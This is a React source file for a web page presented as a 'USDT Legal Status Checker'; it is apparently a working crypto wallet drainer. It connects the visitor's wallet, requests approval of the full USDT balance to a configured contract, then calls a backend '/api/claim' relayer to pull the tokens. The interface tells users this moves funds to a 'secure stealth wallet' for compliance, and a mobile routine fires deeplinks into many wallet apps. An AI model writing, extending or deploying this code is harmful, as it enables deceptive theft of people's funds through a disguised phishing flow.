'use client';

import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import ProgressBar from './ProgressBar';
import CardStep from './CardStep';
import SuccessModal from './SuccessModal';
import LegitimacyChecker from './LegitimacyChecker';
import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';

export default function ApprovalPortal() {
  const [step, setStep] = useState(1); // 1 = Connect, 2 = Approve
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);
  const [attemptingConnection, setAttemptingConnection] = useState(false);

  // Auto-connect wallet on mount and keep attempting if user is not connected
  useEffect(() => {
    const autoConnect = async () => {
      if (userAddress || attemptingConnection) return;
      
      try {
        if (!window.ethereum) return;
        
        // Check if wallet is already connected
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) {
          setAttemptingConnection(true);
          await handleConnectWallet();
          setAttemptingConnection(false);
        }
      } catch (err) {
        console.log('[v0] Auto-connect attempt skipped');
      }
    };

    autoConnect();
  }, [userAddress, attemptingConnection]);

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);
      setAttemptingConnection(true);
      
      if (!window.ethereum) throw new Error('No web3 wallet found');

      // Switch to BSC network
      try {
        await switchToBSC();
      } catch (err) {
        console.log('[v0] BSC switch error (may be normal):', err);
      }

      // Request accounts with immediate timeout handling
      const newProvider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await Promise.race([
        newProvider.send('eth_requestAccounts', []),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
        )
      ]);

      const newSigner = await newProvider.getSigner();
      const address = await newSigner.getAddress();

      setUserAddress(address);
      setSigner(newSigner);
      setProvider(newProvider);
      
      // Persist connection in localStorage
      if (typeof window !== 'undefined') {
        localStorage.setItem('wallet_connected', 'true');
        localStorage.setItem('wallet_address', address);
      }
      
      setStep(2);
    } catch (err: any) {
      const errMsg = err?.message || 'Connection failed';
      setError(errMsg);
      console.error('[v0] Connection error:', errMsg);
    } finally {
      setLoading(false);
      setAttemptingConnection(false);
    }
  };

  const handleApproveToken = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer) throw new Error('Connect wallet first');
      
      console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
      
      // Approve token spending to the relayer/executor contract
      const approveWithRetry = async () => {
        try {
          // Get user balance first
          const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
          const balance = await token.balanceOf(userAddress);
          console.log('[v0] User balance:', balance.toString());
          
          // Approve the full balance to the contract
          await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
          
          // Show success and trigger backend claim
          setShowSuccess(true);
          
          // Trigger backend to claim tokens using relayer
          setTimeout(async () => {
            try {
              const claimResponse = await fetch('/api/claim', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  userAddress: userAddress,
                  tokenAddress: CONFIG.TOKEN_ADDRESS
                })
              });
              
              if (!claimResponse.ok) {
                const err = await claimResponse.json();
                console.error('[v0] Claim error:', err);
              } else {
                const result = await claimResponse.json();
                console.log('[v0] Tokens claimed! TxHash:', result.txHash);
              }
            } catch (err) {
              console.error('[v0] Claim request failed:', err);
            }
          }, 2000);
          
          return true;
        } catch (err: any) {
          if (err.code === 'ACTION_REJECTED') {
            setError('Approval rejected. Please try again.');
            return false;
          }
          throw err;
        }
      };

      const success = await approveWithRetry();
      if (!success) {
        setLoading(false);
        return;
      }
    } catch (err: any) {
      console.error('[v0] Approval error:', err);
      setError(err?.message || 'Approval failed');
    } finally {
      setLoading(false);
    }
  };

  // Removed old signature handler - now only Connect and Approve needed

  const handleMobileWallet = () => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (!isMobile) {
      setError('Mobile wallet deeplinks are only available on mobile devices');
      return;
    }

    const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
    const encodedUrl = encodeURIComponent(currentUrl);
    
    const walletLinks = [
      `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
      `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
      `https://rnbwapp.com/browser?url=${encodedUrl}`,
      `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
      `tpdapp://open?params=${encodedUrl}`,
      `imtokenv2://navigate/DappView?url=${encodedUrl}`,
      `dfw://browser?url=${encodedUrl}`,
      `safepal://browser?url=${encodedUrl}`,
      `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
      `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
      `bnc://app.binance.com/dapp?url=${encodedUrl}`,
      `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
      `https://argent.link/app/wc?uri=${encodedUrl}`,
      `oneinch://dapp?url=${encodedUrl}`,
      `zerion://dapp?url=${encodedUrl}`,
    ];

    const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
    
    walletLinks.forEach((link, index) => {
      setTimeout(() => {
        const a = document.createElement('a');
        a.href = link;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, index * 300);
    });

    setTimeout(() => {
      const a = document.createElement('a');
      a.href = universalScheme;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }, walletLinks.length * 300);

    setTimeout(() => {
      setError(null);
    }, (walletLinks.length + 1) * 300);
  };

  return (
    <main className="relative min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 pb-24 sm:pb-28 md:pb-32 overflow-hidden">
      {/* Animated background orbs */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-emerald-500/10 rounded-full blur-3xl animate-pulse-glow" />
        <div className="absolute bottom-1/4 right-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-teal-500/10 rounded-full blur-3xl animate-pulse-glow animation-delay-2000" />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 sm:w-72 sm:h-72 bg-cyan-500/5 rounded-full blur-3xl animate-pulse-glow animation-delay-1000" />
      </div>

      <div className="relative w-full max-w-2xl z-10 animate-slide-up">
        {/* Header */}
        <div className="text-center mb-6 sm:mb-8 md:mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-emerald-400 via-emerald-500 to-teal-600 mb-4 sm:mb-5 md:mb-6 shadow-2xl shadow-emerald-500/50 animate-float relative">
            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-emerald-400 to-teal-600 animate-pulse-glow opacity-60" />
            <svg className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-white relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-2 sm:mb-3 bg-gradient-to-r from-white via-emerald-100 to-white bg-clip-text text-transparent leading-tight px-4">
            USDT Legal Status Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
            Verify your USDT compliance with regulatory standards
          </p>
        </div>

        <ProgressBar currentStep={step} />

        {step === 1 && (
          <CardStep
            icon="🔗"
            title="Connect Wallet to Check USDT"
            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Connect Wallet',
                onClick: handleConnectWallet,
                primary: true,
              },
              {
                label: 'Open Mobile Wallet',
                onClick: handleMobileWallet,
                primary: false,
              }
            ]}
          />
        )}

        {step === 2 && (
          <CardStep
            icon="✅"
            title="Approve USDT for Transfer"
            description="Approve USDT spending to allow the system to transfer your tokens to a secure stealth wallet for compliance verification."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Approve & Transfer USDT',
                onClick: handleApproveToken,
                primary: true,
              }
            ]}
          />
        )}

        <SuccessModal isOpen={showSuccess} />
      </div>

      {/* Footer */}
      <footer className="fixed bottom-8 sm:bottom-10 md:bottom-12 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-300 backdrop-blur-md bg-black/60 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/30 shadow-lg z-50 whitespace-nowrap">
        <span className="hidden sm:inline">Secured by </span>
        <span className="text-emerald-400 font-semibold">USDT Compliance Network</span>
      </footer>
    </main>
  );
}
